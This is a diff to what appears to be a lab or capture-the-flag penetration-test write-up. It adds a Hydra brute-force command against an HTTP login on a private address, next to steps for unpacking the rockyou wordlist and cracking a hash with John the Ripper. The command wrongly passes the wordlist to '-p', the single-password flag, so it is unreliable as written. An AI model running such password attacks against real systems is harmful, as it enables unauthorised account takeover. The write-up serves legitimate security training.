@@ -120,6 +120,8 @@ c) **Exploitation**
 
 - `gunzip /usr/share/wordlists/rockyou.txt.gz`
 
+- Hydra brute force action: `hydra -l ashton -p /usr/share/wordlists/rockyou.txt -s 80 -f -vV 192.168.1.105 http-get /company_folders/secret_folder/`
+
 - New username noted: ryan, need to crack its hash
 
 - Crack hash with john the ripper
